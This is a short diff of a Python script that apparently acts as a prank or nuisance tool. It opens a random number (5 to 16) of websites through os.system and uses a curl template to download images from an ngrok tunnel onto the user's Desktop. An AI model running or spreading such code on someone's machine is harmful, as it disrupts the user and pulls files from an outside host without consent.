@@ -49,6 +49,7 @@ def open_random_webpages(number_of_sites):
     for _ in range(number_of_sites):
         os.system(cmd.format(random.choice(websites)))
 
+number_of_sites = random.randint(5, 16)
 open_random_webpages(number_of_sites)
 
 icon_cmd = "curl -o ~/Desktop/{}.png 'https://bc6e-149-102-226-242.ngrok-free.app/mac-icons/downloads/1%20({}).png'"
